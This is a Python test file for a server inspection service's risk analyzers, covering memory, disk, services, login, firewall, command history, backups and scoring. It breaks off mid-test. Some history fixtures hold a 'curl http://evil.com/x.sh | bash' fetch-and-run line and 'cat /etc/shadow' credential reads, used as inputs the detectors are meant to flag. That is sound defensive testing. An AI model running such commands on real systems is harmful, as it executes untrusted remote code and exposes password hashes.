"""Quick functional tests for the new analyzers (P0/P1/P2 plan)."""
import sys
sys.path.insert(0, '.')

import app.services.inspection_center as svc


def test_memory_meminfo():
    """P0-1: /proc/meminfo should be used to compute MemAvailable."""
    meminfo = """              total        used        free      shared  buff/cache   available
Mem:           7823        4521        812         102        2490        3010
Swap:          2047         512        1535
---MEMINFO---
MemTotal:        8012340 kB
MemFree:          832000 kB
MemAvailable:    3081000 kB
Buffers:          250000 kB
Cached:          2248000 kB
SwapTotal:       2097148 kB
SwapFree:        1572864 kB
"""
    r, s, m, sg, f = svc._analyze_memory(meminfo, "", 0)
    assert f["source"] == "meminfo", f"expected meminfo source, got {f['source']}"
    assert 60 <= f["mem_pct"] <= 65, f"expected mem_pct ~62, got {f['mem_pct']}"
    assert 24 <= f["swap_pct"] <= 26, f"expected swap_pct ~25, got {f['swap_pct']}"
    print(f"  PASS: mem_pct={f['mem_pct']}%, swap_pct={f['swap_pct']}%, source={f['source']}")


def test_memory_high():
    meminfo = """              total        used        free      shared  buff/cache   available
Mem:           7823        7700        100         0           23           100
---MEMINFO---
MemTotal:        8012340 kB
MemAvailable:    102400 kB
"""
    r, s, m, sg, f = svc._analyze_memory(meminfo, "", 0)
    assert r == "HIGH", f"expected HIGH, got {r}"
    print(f"  PASS: HIGH risk when mem_pct={f['mem_pct']}%")


def test_service_no_failed():
    out = "---SYSTEMD_FAILED---\n0 loaded units listed.\n---SYSTEMD_ACTIVE---\nnginx: active\n---PM2_JLIST---\nPM2_NOT_FOUND\n---PM2_PING---\n---ETCD_HEALTH---\nETCD_NOT_FOUND\n---PROCESS_KEYWORDS---\n"
    r, s, m, sg, f = svc._analyze_service(out, "", 0, {})
    assert r == "NONE", f"expected NONE, got {r}, msg={m}"
    print(f"  PASS: NONE risk when no failed units")


def test_service_high_when_5_failed():
    out = "---SYSTEMD_FAILED---\n2 failed units listed.\n" + "\n".join([
        "● nginx.service          loaded failed failed  nginx",
        "● mysql.service          loaded failed failed  MySQL",
        "● redis.service          loaded failed failed  redis",
        "● docker.service         loaded failed failed  Docker",
        "● etcd.service           loaded failed failed  etcd",
    ]) + "\n---SYSTEMD_ACTIVE---\n---PM2_JLIST---\nPM2_NOT_FOUND\n---PM2_PING---\n---ETCD_HEALTH---\nETCD_NOT_FOUND\n---PROCESS_KEYWORDS---\n"
    r, s, m, sg, f = svc._analyze_service(out, "", 0, {})
    assert r == "HIGH", f"expected HIGH (>=3 failed), got {r}, failed={f['failed_units']}, msg={m}"
    print(f"  PASS: HIGH risk when 5 units failed: {f['summary']}")


def test_service_medium_when_2_failed():
    out = "---SYSTEMD_FAILED---\n2 failed units listed.\n" + "\n".join([
        "● nginx.service          loaded failed failed  nginx",
        "● mysql.service          loaded failed failed  MySQL",
    ]) + "\n---SYSTEMD_ACTIVE---\n---PM2_JLIST---\nPM2_NOT_FOUND\n---PM2_PING---\n---ETCD_HEALTH---\nETCD_NOT_FOUND\n---PROCESS_KEYWORDS---\n"
    r, s, m, sg, f = svc._analyze_service(out, "", 0, {})
    assert r == "MEDIUM", f"expected MEDIUM (<3 failed), got {r}, failed={f['failed_units']}, msg={m}"
    print(f"  PASS: MEDIUM risk when 2 units failed")


def test_custom_command_exit_1():
    """P0-3: exit=1 is grep "no match" - should be PASS."""
    # Realistic pattern: "error_count: 0" (typical monitoring output)
    r, s, m, sg, f = svc._analyze_custom_command("error_count: 0\nfail_count: 0\nall_good: 1\n", "", 1)
    assert r == "NONE", f"expected NONE for exit=1 with count=0 noise, got {r}, matched={f['matched_keywords']}"
    print(f"  PASS: exit=1 + count:0 noise → NONE (matched={f['matched_keywords']})")


def test_custom_command_exit_2():
    r, s, m, sg, f = svc._analyze_custom_command("cmd not found\n", "", 2)
    assert r == "HIGH", f"expected HIGH for exit=2, got {r}"
    print(f"  PASS: exit=2 → HIGH")


def test_custom_command_word_boundary():
    r, s, m, sg, f = svc._analyze_custom_command("Error: file not found", "", 0)
    assert r == "MEDIUM", f"expected MEDIUM for Error word, got {r}"
    print(f"  PASS: 'Error' word boundary → MEDIUM")


def test_custom_command_log_path_noise():
    """P0-3: /var/log/.../error.log should be stripped of 'error' word."""
    r, s, m, sg, f = svc._analyze_custom_command("tail /var/log/nginx/error.log\n", "", 0)
    assert r == "NONE", f"expected NONE for log path noise, got {r}, matched={f['matched_keywords']}"
    print(f"  PASS: log path noise → NONE (matched={f['matched_keywords']})")


def test_disk_skip_fstype():
    """P0-4: overlay 100% should not raise risk; only /dev/sda1 at 92% should."""
    out = """---SPACE---
Filesystem              Type  Size  Used Avail Use% Mounted on
/dev/sda1               ext4  100G   92G  8.0G  92% /
overlay                 overlay  10G  10G  0    100% /var/lib/docker/overlay2
tmpfs                   tmpfs  1.0G  100M 901M  10% /tmp
---INODE---
/dev/sda1               ext4  6.5M  1.2M  5.3M  19% /
"""
    r, s, m, sg, f = svc._analyze_disk(out, "", 0, {})
    assert "overlay" in f["skipped_fstypes"], "overlay should be in skipped"
    assert r == "HIGH", f"expected HIGH (sda1 92%), got {r}"
    print(f"  PASS: skip overlay, sda1 92% → HIGH; skipped={f['skipped_fstypes']}")


def test_disk_nfs_stale():
    out = """---SPACE---
Filesystem              Type  Size  Used Avail Use% Mounted on
/dev/sda1               ext4  100G   10G  90G  10% /
nfs-server:/backup      nfs4  500G  498G  2.0G  99% /mnt/backup
---INODE---
"""
    r, s, m, sg, f = svc._analyze_disk(out, "", 0, {})
    assert f["stale_mounts"], "should have detected NFS stale"
    assert r == "MEDIUM", f"expected MEDIUM for NFS stale, got {r}"
    print(f"  PASS: NFS 99% → MEDIUM stale (stale={f['stale_mounts']})")


def test_login_single_ip_high():
    out = """root     pts/0        192.168.1.1   Mon Jun  2 09:03 - 09:50  (00:47)
---FAILED---
admin    ssh:notty    10.0.0.5     Mon Jun  2 08:00 - 08:05  (00:05)
"""
    failed_lines = "\n".join([f"attacker     ssh:notty    10.0.0.5     Mon Jun  2 08:0{i % 10} - 08:0{i % 10 + 1}  (00:01)" for i in range(60)])
    out = f"root     pts/0        192.168.1.1   Mon Jun  2 09:03 - 09:50  (00:47)\n---FAILED---\n{failed_lines}\n"
    r, s, m, sg, f = svc._analyze_login(out, "", 0, {})
    assert r == "HIGH", f"expected HIGH (single IP 60 fails), got {r}"
    print(f"  PASS: single IP 60 fails → HIGH")


def test_login_root_remote_whitelist():
    out = """root     pts/0        10.0.0.99   Mon Jun  2 09:03 - 09:50  (00:47)
---FAILED---
"""
    r, s, m, sg, f = svc._analyze_login(out, "", 0, {"LOGIN_SECURITY": {"root_remote_ip_whitelist": ["10.0.0.99"]}})
    # 期望：白名单内的 root 远程登录不再触发 LOW
    assert r != "LOW", f"whitelisted root should not trigger LOW, got {r}, msg={m}"
    print(f"  PASS: whitelisted root remote login → {r} (not LOW)")


def test_login_root_remote_no_whitelist():
    out = """root     pts/0        10.0.0.99   Mon Jun  2 09:03 - 09:50  (00:47)
---FAILED---
"""
    r, s, m, sg, f = svc._analyze_login(out, "", 0, {})
    # 期望：非白名单的 root 远程登录触发 LOW
    assert r == "LOW", f"non-whitelisted root should trigger LOW, got {r}"
    print(f"  PASS: non-whitelisted root remote login → LOW")


def test_firewall_cloud_low():
    """P1-4: no local firewall + no detected tools + 'inactive' in output → LOW."""
    out = """● firewalld.service - firewalld - dynamic firewall daemon
   Loaded: loaded (/usr/lib/systemd/system/firewalld.service; disabled; vendor preset: enabled)
   Active: inactive (dead)
"""
    r, s, m, sg, f = svc._analyze_firewall(out, "", 0, {})
    assert r in ("LOW", "MEDIUM"), f"expected LOW or MEDIUM, got {r}"
    assert f["no_local_firewall"] is True, "no_local_firewall should be True"
    print(f"  PASS: no local firewall → {r} (no_local_firewall={f['no_local_firewall']})")


def test_firewall_global_pass():
    out = """-A INPUT -p all -j ACCEPT -s 0.0.0.0/0
-A INPUT -p tcp -j ACCEPT -s 10.0.0.0/8
"""
    r, s, m, sg, f = svc._analyze_firewall(out, "", 0, {})
    assert r == "HIGH", f"expected HIGH for global pass, got {r}"
    print(f"  PASS: global pass rule → HIGH")


def test_history_sensitive_read():
    out = "---HISTORY---\ncat /etc/shadow | head -5\n---ROOT---\nls -la\n---HISTORY---\n"
    r, s, m, sg, f = svc._analyze_history(out, "", 0, {})
    assert r == "HIGH", f"expected HIGH for cat /etc/shadow, got {r}, hit={f['hit_keywords']}"
    print(f"  PASS: cat /etc/shadow → HIGH")


def test_history_passwd_no_longer_alert():
    """P2-1: cat /etc/passwd should NOT trigger alert (legitimate operation)."""
    out = "---HISTORY---\ncat /etc/passwd\nls -la\n---HISTORY---\n"
    r, s, m, sg, f = svc._analyze_history(out, "", 0, {})
    assert r == "NONE", f"expected NONE for cat /etc/passwd, got {r}, hit={f['hit_keywords']}"
    print(f"  PASS: cat /etc/passwd → NONE (no longer alert)")


def test_history_curl_pipe_bash():
    out = "---HISTORY---\ncurl http://evil.com/x.sh | bash\n---HISTORY---\n"
    r, s, m, sg, f = svc._analyze_history(out, "", 0, {})
    assert r == "HIGH", f"expected HIGH for curl|bash, got {r}, hit={f['hit_keywords']}"
    print(f"  PASS: curl | bash → HIGH")


def test_backup_systemd_timer():
    out = """---CRON---
---CRON_D---
backup-daily.timer
systemd-tmpfiles-clean.timer
---TIMER---
Mon 2026-06-04 03:00:00 CST  1h Mon 2026-06-04 02:00:00 CST  systemd-tmpfiles-clean.timer
Mon 2026-06-04 04:00:00 CST  2h Mon 2026-06-04 02:00:00 CST  backup-daily.timer
---BACKUPS---
/data/backups/2026-06-04_030000.tar.gz 102400
"""
    r, s, m, sg, f = svc._analyze_backup(out, "", 0, {})
    assert f["timer_lines"], "should detect systemd timers"
    assert r == "NONE", f"expected NONE, got {r}, summary={f['summary']}"
    print(f"  PASS: systemd timer detected, summary={f['summary']}")


def test_score_cap_60():
    """P1-5: 5 HIGHs should be capped at 60 deduction."""
    score = svc._compute_score(5, 0, 0)
    assert score == 100 - 60, f"5 HIGH should be 100-60=40, got {score}"
    score = svc._compute_score(10, 0, 0)
    assert score == 40, f"10 HIGH should be capped at 40, got {score}"
    print(f"  PASS: 5 HIGHs → 40, 10 HIGHs → 40 (capped)")


def test_score_normal():
    score = svc._compute_score(0, 0, 0)
    assert score == 100, f"0 issues should be 100, got {score}"
    score = svc._compute_score(1, 2, 3)
    assert score == 100 - 15 - 16 - 6, f"1H/2M/3L should be 63, got {score}"
    print(f"  PASS: 0 → 100, 1H/2M/3L → 63")


def test_aggregate_risk_counts_max_per_key():
    """P1-5: same (server, category) should only count once with the highest level."""
    from types import SimpleNamespace
    rows = [
        SimpleNamespace(server_id="s1", category="DISK", risk_level="HIGH"),
        SimpleNamespace(server_id="s1", category="DISK", risk_level="LOW"),  # should be ignored
        SimpleNamespace(server_id="s1", category="DISK", risk_level="MEDIUM"),  # should be ignored
        SimpleNamespace(server_id="s1", category="LOGIN", risk_level="MEDIUM"),
        SimpleNamespace(server_id="s2", category="DISK", risk_level="LOW"),
    ]
    high, medium, low, normal = svc._aggregate_risk_counts(rows)
    # Expected: s1/DISK=HIGH, s1/LOGIN=MEDIUM, s2/DISK=LOW → 1H/1M/1L
    assert high == 1 and medium == 1 and low == 1, f"expected 1H/1M/1L, got {high}/{medium}/{low}"
    print(f"  PASS: aggregate risk counts per (server, category) → {high}H/{medium}M/{low}L")


def test_coerce_thresholds_string_to_int():
    """Threshold type safety: int as string should be coerced to int."""
    result = svc._coerce_thresholds("DISK", {"high_pct": "85", "medium_pct": 70, "skip_fstypes": "overlay,squashfs"})
    assert result["high_pct"] == 85, f"expected 85, got {result['high_pct']}"
    assert result["medium_pct"] == 70
    assert "overlay" in result["skip_fstypes"]
    print(f"  PASS: coerce string '85' to int 85, comma list to list")


# ============================================================
# A1 / A2 / A3 / A4 / A5 P0 修复专项测试
# ============================================================

def test_a1_login_legacy_failed_high_total_only():
    """A1: 仅传入老字段 `failed_high=10`（不带 per_ip/total）时，
    total 阈值不能与 per_ip 阈值同时回退到 10（否则单 IP 10 次就 HIGH）。
    """
    out = """root     pts/0        192.168.1.1   Mon Jun  2 09:03 - 09:50  (00:47)
---FAILED---
"""
    # 30 个 IP 各 1 次（不触发 per_ip=10）
    failed_lines = "\n".join([f"u{i}    ssh:notty    10.0.0.{i % 250 + 1}   Mon Jun  2 08:00 - 08:01  (00:01)" for i in range(30)])
    out2 = f"root     pts/0        192.168.1.1   Mon Jun  2 09:03 - 09:50  (00:47)\n---FAILED---\n{failed_lines}\n"
    r, s, m, sg, f = svc._analyze_login(out2, "", 0, {"LOGIN_SECURITY": {"failed_high": 10}})
    # 新逻辑：failed_high 仅作 per_ip 回退（50）；total 回退为 200。
    # 30 个 IP 各 1 次 → 不会 per_ip HIGH（per_ip 实际 50），不会 total HIGH（30 < 200）
    assert r == "LOW", f"A1 fix: legacy failed_high=10 should not cause per_ip=10 → HIGH; got {r}, msg={m}"
    print(f"  PASS: A1 legacy field total/per_ip split → LOW for 30 IPs x 1 fail")


def test_a2_port_cpu_double_sampling_both_must_exceed():
    """A2: 两次采样都 ≥ 阈值才记入；一次 ≥ 一次 < 阈值应被过滤。
    实际 ps 命令格式：ps -eo pid,ppid,user,comm,%cpu,%mem,args（7 列）。
    """
    out = """---TOP---
PID PPID USER     COMM %CPU %MEM ARGS
100 1    root     mysqld 95.0 1.0 /usr/sbin/mysqld
---TOP---
PID PPID USER     COMM %CPU %MEM ARGS
100 1    root     mysqld 40.0 1.0 /usr/sbin/mysqld
---TOP---
"""
    r, s, m, sg, f = svc._analyze_process_ports(out, "", 0, {"PROCESS_PORT": {"cpu_sample_count": 2, "cpu_threshold": 80.0}})
    # 期望：1 次 ≥ 80 + 1 次 < 80 → 不记入 high_cpu_procs
    assert not f.get("high_cpu_procs"), f"high_cpu_procs should be empty; got {f.get('high_cpu_procs')}"
    assert r in ("NONE", "LOW"), f"A2: one < threshold should filter out; got {r}"
    print(f"  PASS: A2 double sampling (95%/40%) → filtered (high_cpu={f.get('high_cpu_procs')})")


def test_a2_port_cpu_double_sampling_both_exceed():
    """A2: 两次都 ≥ 80 → 应记入 high_cpu_procs。
    实际 ps 命令格式：ps -eo pid,ppid,user,comm,%cpu,%mem,args（7 列）。
    """
    out = """---TOP---
PID PPID USER     COMM %CPU %MEM ARGS
100 1    root     mysqld 90.0 1.0 /usr/sbin/mysqld
---TOP---
PID PPID USER     COMM %CPU %MEM ARGS
100 1    root     mysqld 85.0 1.0 /usr/sbin/mysqld
---TOP---
"""
    r, s, m, sg, f = svc._analyze_process_ports(out, "", 0, {"PROCESS_PORT": {"cpu_sample_count": 2, "cpu_threshold": 80.0}})
    assert f.get("high_cpu_procs"), f"A2: both samples >= 80 should be in high_cpu_procs; got {f.get('high_cpu_procs')}"
    assert any(p.get("pid") == 100 for p in f["high_cpu_procs"]), "pid 100 should be flagged"
    print(f"  PASS: A2 double sampling (90%/85%) both ≥ 80 → flagged (high_cpu_procs has pid 100)")


def test_a3_login_root_remote_visible_in_high_burst():
    """A3: 单 IP HIGH 命中时，root 远程登录（白名单外）作为附加 facts 仍可查见。
    """
    # 100 次单 IP 失败 → HIGH
    failed_lines = "\n".join([f"attacker     ssh:notty    10.0.0.5     Mon Jun  2 08:0{i % 10} - 08:0{i % 10 + 1}  (00:01)" for i in range(100)])
    out = f"root     pts/0        10.0.0.99   Mon Jun  2 09:03 - 09:50  (00:47)\n---FAILED---\n{failed_lines}\n"
    r, s, m, sg, f = svc._analyze_login(out, "", 0, {})
    assert r == "HIGH", f"expected HIGH, got {r}"
    assert "root_remote_login" in f, "A3 fix: root remote login fact should be present even with HIGH burst"
    assert f["root_remote_login"]["count"] >= 1
    assert "10.0.0.99" in f["root_remote_login"]["ips"]
    # 消息中也应同时出现"root 远程登录"
    assert "root 远程登录" in m, f"msg should mention root remote; got: {m}"
    print(f"  PASS: A3 root remote login in facts even with HIGH burst")


def test_a4_backup_min_age_enforced():
    """A4: 备份文件 mtime > min_age_days → MEDIUM（而不是 PASS）。"""
    from datetime import datetime, timedelta
    now = datetime.now()
    old_time = (now - timedelta(days=10)).strftime("%Y-%m-%dT%H:%M")
    now_ts = int(now.timestamp())
    out = f"""---CRON---
---CRON_D---
backup-daily.sh
---TIMER---
---BACKUPS---
/data/backups/2026-05-25_030000.tar.gz 102400 {old_time}
---NOW---
{now_ts}
"""
    r, s, m, sg, f = svc._analyze_backup(out, "", 0, {})
    # daily 粒度下 min_age=1，但文件已 10 天前 → MEDIUM
    assert f["granularity"] in ("daily", "monthly"), f"granularity={f['granularity']}"
    # 兜底 daily 阈值 1 天 → 10 天 > 1 → age_stale=True → MEDIUM
    assert f.get("age_stale") is True or r == "MEDIUM", f"A4: 10d old backup should be MEDIUM; got {r}, facts={f}"
    print(f"  PASS: A4 min_age enforced (10d > 1d daily) → {r} (age={f.get('latest_age_days')})")


def test_a4_backup_within_window_passes():
    """A4: daily 粒度，备份 0.5 天前 → PASS。"""
    from datetime import datetime, timedelta
    now = datetime.now()
    fresh_time = (now - timedelta(hours=12)).strftime("%Y-%m-%dT%H:%M")
    now_ts = int(now.timestamp())
    out = f"""---CRON---
---CRON_D---
backup-daily.sh
---TIMER---
---BACKUPS---
/data/backups/{fresh_time[:10]}_030000.tar.gz 102400 {fresh_time}
---NOW---
{now_ts}
"""
    r, s, m, sg, f = svc._analyze_backup(out, "", 0, {})
    assert r == "NONE", f"expected NONE for fresh backup, got {r}, age={f.get('latest_age_days')}"
    print(f"  PASS: A4 daily backup 0.5d ago → NONE")


def test_a5_score_averages_by_server_count():
    """A5: 8 机器各 1 HIGH → avg_deduction=15 → score=85（不是 40）。"""
    score = svc._compute_score(8, 0, 0, server_count=8)
    assert score == 85, f"8 HIGHs across 8 servers should avg → 85, got {score}"
    print(f"  PASS: A5 8 HIGHs/8 servers → 85 (avg)")

    # 单机 1 HIGH → score=85
    score = svc._compute_score(1, 0, 0, server_count=1)
    assert score == 85, f"1 HIGH 1 server should be 85, got {score}"

    # 单机 9 项 HIGH → cap avg=135/1=135 → cap 60 → 40
    score = svc._compute_score(9, 0, 0, server_count=1)
    assert score == 40, f"9 HIGHs 1 server should be 40, got {score}"

    # 100 机器 100 HIGH → avg=15 → 85
    score = svc._compute_score(100, 0, 0, server_count=100)
    assert score == 85, f"100 HIGHs/100 servers should avg → 85, got {score}"
    print(f"  PASS: A5 score averages per-server, cap at 60")


def test_a5_score_caps_at_60_deduction():
    """A5: 单机 5 HIGH → 5*15=75 → cap 60 → 40（与原行为一致）。"""
    score = svc._compute_score(5, 0, 0, server_count=1)
    assert score == 40, f"5 HIGH 1 server should be 40, got {score}"
    print(f"  PASS: A5 cap=60 retained for single-server overload")


# ============================================================
# B1 / B2 / B3 / B4 / B5 / B6 / B7 / B8 P1 修复专项测试
# ============================================================

def test_b1_custom_command_missing_script_in_stderr_high():
    """B1: stderr 含 'command not found' → 强制 HIGH（覆盖 exit=0）。"""
    out = "starting up...\n"
    err = "bash: my-custom-monitor.sh: command not found\n"
    r, s, m, sg, f = svc._analyze_custom_command(out, err, 0, {})
    assert r == "HIGH", f"B1: command not found in stderr should be HIGH; got {r}, msg={m}"
    assert f.get("missing_command") is True, "missing_command fact should be set"
    print(f"  PASS: B1 'command not found' in stderr → HIGH (even with exit=0)")


def test_b1_custom_command_no_such_file_in_stderr_high():
    """B1: stderr 含 'No such file or directory' → 强制 HIGH。"""
    r, s, m, sg, f = svc._analyze_custom_command("", "ls: /opt/missing/dir: No such file or directory\n", 1, {})
    assert r == "HIGH", f"B1: 'No such file' in stderr should be HIGH; got {r}"
    print(f"  PASS: B1 'No such file or directory' in stderr → HIGH")


def test_b1_custom_command_missing_in_out_high():
    """B1: command not found 在 stdout 中也应触发 HIGH。"""
    r, s, m, sg, f = svc._analyze_custom_command("/bin/sh: mytool: command not found\n", "", 127, {})
    assert r == "HIGH", f"B1: command not found in stdout should be HIGH; got {r}"
    print(f"  PASS: B1 'command not found' in stdout → HIGH")


def test_b2_disk_inode_system_offset_applied():
    """B2: / 分区 inode 86% → system_pct_offset=5 → 有效阈值 85 → 应 HIGH（不再是 PASS）。"""
    out = """---SPACE---
Filesystem              Type  Size  Used Avail Use% Mounted on
/dev/sda1               ext4  100G   50G  50G  50% /
---INODE---
/dev/sda1               ext4  6.5M  5.6M  0.9M  86% /
"""
    r, s, m, sg, f = svc._analyze_disk(out, "", 0, {})  # 默认 system_pct_offset=5, system_mounts={/,/boot,...}
    # / 在 system_mounts 中，effective HIGH=90-5=85，86%>=85 → HIGH
    assert r == "HIGH", f"B2: / inode 86% with system offset 5 should be HIGH; got {r}, msg={m}"
    assert "系统分区" in m, f"B2: msg should mention system partition threshold; got: {m}"
    print(f"  PASS: B2 / inode 86% with system offset → HIGH")


def test_b2_disk_inode_non_system_no_offset():
    """B2: /data inode 91% 不在 system_mounts → 有效阈值仍 90 → HIGH（不会被偏移提前）。"""
    out = """---SPACE---
Filesystem              Type  Size  Used Avail Use% Mounted on
/dev/sda1               ext4  100G   50G  50G  50% /
/dev/sdb1               ext4  500G  250G 250G  50% /data
---INODE---
/dev/sda1               ext4  6.5M  3.0M  3.5M  46% /
/dev/sdb1               ext4  60M  54.6M  5.4M  91% /data
"""
    r, s, m, sg, f = svc._analyze_disk(out, "", 0, {})
    # /data 不在默认 system_mounts，effective HIGH=90，91%>=90 → HIGH
    # 且 msg 中不出现"系统分区"（因为 /data 不是系统分区）
    assert r == "HIGH", f"B2: /data inode 91% (non-system) should be HIGH; got {r}"
    assert "系统分区" not in m, f"B2: msg should NOT mention system partition for /data; got: {m}"
    print(f"  PASS: B2 /data inode 91% (non-system mount) → HIGH without system offset")


def test_b2_disk_inode_system_offset_lowers_threshold():
    """B2: / 分区 inode 86% + 系统 offset 5 → 有效阈值 85 → HIGH（这正是 B2 修复点）。"""
    out = """---SPACE---
Filesystem              Type  Size  Used Avail Use% Mounted on
/dev/sda1               ext4  100G   50G  50G  50% /
---INODE---
/dev/sda1               ext4  6.5M  5.6M  0.9M  86% /
"""
    r, s, m, sg, f = svc._analyze_disk(out, "", 0, {})
    # / 在 system_mounts，effective HIGH=90-5=85，86%>=85 → HIGH
    assert r == "HIGH", f"B2: / inode 86% with system offset 5 should be HIGH; got {r}"
    assert "系统分区" in m, f"B2: msg should mention 系统分区阈值; got: {m}"
    # 但同样的 86% 在 /data 不会被偏移：effective 90 → 86 < 90 → MEDIUM（medium 阈值 80）
    out2 = """---SPACE---
Filesystem              Type  Size  Used Avail Use% Mounted on
/dev/sda1               ext4  100G   50G  50G  50% /
/dev/sdb1               ext4  500G  250G 250G  50% /data
---INODE---
/dev/sda1               ext4  6.5M  3.0M  3.5M  46% /
/dev/sdb1               ext4  60M  51.6M  8.4M  86% /data
"""
    r2, _, m2, _, _ = svc._analyze_disk(out2, "", 0, {})
    assert r2 == "MEDIUM", f"B2: /data inode 86% (non-system) should be MEDIUM (80 threshold), not HIGH; got {r2}"
    assert "系统分区" not in m2, f"B2: /data is non-system, msg should not say 系统分区; got: {m2}"
    print(f"  PASS: B2 system offset only applied to system mounts (/: HIGH, /data: MEDIUM)")


def test_b3_firewall_detects_nftables():
    """B3: nft list ruleset 输出应被视为有防火墙，不应触发 no_local_firewall。"""
    out = "nft list ruleset\ntable inet filter {\n  chain input {\n    type filter hook input priority 0; policy drop;\n  }\n}\n"
    r, s, m, sg, f = svc._analyze_firewall(out, "", 0, {})
    assert f.get("no_local_firewall") is False, f"B3: nftables should not be flagged as no-local-firewall; facts={f}"
    print(f"  PASS: B3 nftables detected, no_local_firewall=False")


def test_b3_firewall_detects_ip6tables():
    """B3: ip6tables -L 输出应被视为有防火墙。"""
    out = "ip6tables -L\nChain INPUT (policy DROP)\ntarget     prot opt source               destination\n"
    r, s, m, sg, f = svc._analyze_firewall(out, "", 0, {})
    assert f.get("no_local_firewall") is False, f"B3: ip6tables should not be flagged; facts={f}"
    print(f"  PASS: B3 ip6tables detected, no_local_firewall=False")


def test_b3_firewall_truly_empty_still_flagged():
    """B3: 完全空输出 + 全 inactive 仍应触发 no_local_firewall（云环境 LOW 提示）。"""
    out = "inactive\n"  # 仅 inactive，无任何工具签名
    r, s, m, sg, f = svc._analyze_firewall(out, "", 0, {})
    assert f.get("no_local_firewall") is True, f"B3: empty output + inactive should still flag; facts={f}"
    assert r == "LOW", f"B3: cloud default level should be LOW; got {r}"
    print(f"  PASS: B3 truly empty + inactive → LOW (no_local_firewall=True)")


def test_b4_project_analyzers_return_5tuple():
    """B4: 项目 analyzer 必须返回 5-tuple（含 parsed_facts）。"""
    # runtime
    r = svc._analyze_project_runtime("---PORT---\nlisten ok\n", "", 0)
    assert len(r) == 5, f"project_runtime should return 5-tuple, got {len(r)}"
    risk, status, msg, sug, facts = r
    assert isinstance(facts, dict) and "summary" in facts, f"project_runtime facts invalid: {facts}"
    # files
    r = svc._analyze_project_files("normal content", "", 0)
    assert len(r) == 5, f"project_files should return 5-tuple, got {len(r)}"
    # api
    r = svc._analyze_project_api("normal api log content", "", 0)
    assert len(r) == 5, f"project_api should return 5-tuple, got {len(r)}"
    # backup
    r = svc._analyze_project_backup("/backup/db.sql 1024 2026-06-04T03:00\n", "", 0)
    assert len(r) == 5, f"project_backup should return 5-tuple, got {len(r)}"
    print(f"  PASS: B4 all 4 project analyzers return 5-tuple with parsed_facts")


def test_b4_project_runtime_thresholds_param_accepted():
    """B4: 项目 analyzer 必须接受 thresholds 参数（与其他 server analyzer 一致）。"""
    r = svc._analyze_project_runtime("---PORT---\nok\n", "", 0, {"FOO": {"x": 1}})
    assert len(r) == 5
    print(f"  PASS: B4 project_runtime accepts thresholds kwarg")


def test_b5_load_thresholds_deterministic_order():
    """B5: _load_thresholds 在 db=None 时直接返回 DEFAULT，不依赖 SQLAlchemy。"""
    cfg = svc._load_thresholds(db=None)
    # 多次调用结果完全一致
    cfg2 = svc._load_thresholds(db=None)
    assert cfg == cfg2, "B5: _load_thresholds(db=None) should be deterministic"
    # 所有 DEFAULT 类别都在
    for cat in ("DISK", "MEMORY", "FIREWALL", "BACKUP", "LOGIN_SECURITY", "PROCESS_PORT", "SERVICE_STATUS", "COMMAND_HISTORY", "ACCOUNT_SECURITY"):
        assert cat in cfg, f"B5: missing default cat {cat}"
    print(f"  PASS: B5 _load_thresholds(db=None) deterministic, {len(cfg)} cats present")


def test_b5_load_thresholds_uses_order_by_in_query():
    """B5: 验证 _load_thresholds 在 db 有值时显式调用 .order_by()。
    通过静态检查源码确保 order_by 出现。"""
    import inspect
    src = inspect.getsource(svc._load_thresholds)
    assert ".order_by(" in src, "B5: _load_thresholds should call .order_by() for determinism"
    assert "category.asc()" in src and "id.asc()" in src, "B5: order should be (category, id) asc"
    print(f"  PASS: B5 _load_thresholds source uses .order_by(category.asc(), id.asc())")


def test_b6_backup_application_server_downgrade():
    """B6: 应用服务器（is_application_server=True）+ 无 cron + 无备份 → MEDIUM。"""
    out = "---CRON---\n---CRON_D---\n---TIMER---\n---BACKUPS---\n---NOW---\n9999999999\n"
    r, s, m, sg, f = svc._analyze_backup(out, "", 0, {"BACKUP": {"is_application_server": True}})
    assert r == "MEDIUM", f"B6: app server no-backup should be MEDIUM; got {r}, msg={m}"
    assert "应用服务器" in m, f"B6: msg should mention application server; got: {m}"
    print(f"  PASS: B6 app server no-backup → MEDIUM")


def test_b6_backup_normal_server_still_high():
    """B6: 普通服务器（is_application_server=False）+ 无 cron + 无备份 → 仍 HIGH。"""
    out = "---CRON---\n---CRON_D---\n---TIMER---\n---BACKUPS---\n---NOW---\n9999999999\n"
    r, s, m, sg, f = svc._analyze_backup(out, "", 0, {"BACKUP": {"is_application_server": False}})
    assert r == "HIGH", f"B6: non-app server no-backup should be HIGH; got {r}"
    print(f"  PASS: B6 non-app server no-backup → HIGH (unchanged)")


def test_b7_risk_order_unified():
    """B7: RISK_ORDER 与 RISK_WEIGHT 解耦；_risk_weight 走 RISK_ORDER。"""
    # RISK_ORDER 单一来源
    assert hasattr(svc, "RISK_ORDER"), "B7: RISK_ORDER constant should exist"
    assert svc.RISK_ORDER == {"HIGH": 4, "MEDIUM": 3, "LOW": 2, "NONE": 1}
    # _risk_weight 返回 RISK_ORDER 值
    assert svc._risk_weight("HIGH") == 4
    assert svc._risk_weight("MEDIUM") == 3
    assert svc._risk_weight("LOW") == 2
    assert svc._risk_weight("NONE") == 1
    # RISK_WEIGHT 仍然用于 _compute_score（不变）
    assert svc.RISK_WEIGHT == {"HIGH": 15, "MEDIUM": 8, "LOW": 2, "NONE": 0}
    print(f"  PASS: B7 RISK_ORDER unified; _risk_weight uses RISK_ORDER; RISK_WEIGHT preserved for score")


def test_b7_aggregate_uses_risk_order():
    """B7: _aggregate_risk_counts 应该用 RISK_ORDER 而非老 _risk_weight 函数。"""
    import inspect
    src = inspect.getsource(svc._aggregate_risk_counts)
    assert "RISK_ORDER" in src, "B7: _aggregate_risk_counts should reference RISK_ORDER"
    print(f"  PASS: B7 _aggregate_risk_counts uses RISK_ORDER")


def test_b8_shadow_read_re_used_in_analyzer():
    """B8: shadow_read_re 必须被 analyzer 实际使用（消除死字段）。"""
    out = "some log\ncat /etc/shadow was attempted\nmore history\n"
    r, s, m, sg, f = svc._analyze_history(out, "", 0, {})
    assert r == "HIGH", f"B8: shadow read should be HIGH; got {r}"
    assert "shadow_read_re" in f.get("thresholds", {}), "B8: shadow_read_re should be in facts.thresholds"
    print(f"  PASS: B8 shadow_read_re is consumed; cat /etc/shadow → HIGH")


def test_b8_shadow_read_re_configurable():
    """B8: shadow_read_re 可由 DB 配置覆盖（自定义更宽松的检测）。"""
    # 自定义更宽松的 regex：包含 "view /etc/shadow" 也算
    out = "view /etc/shadow was attempted\n"
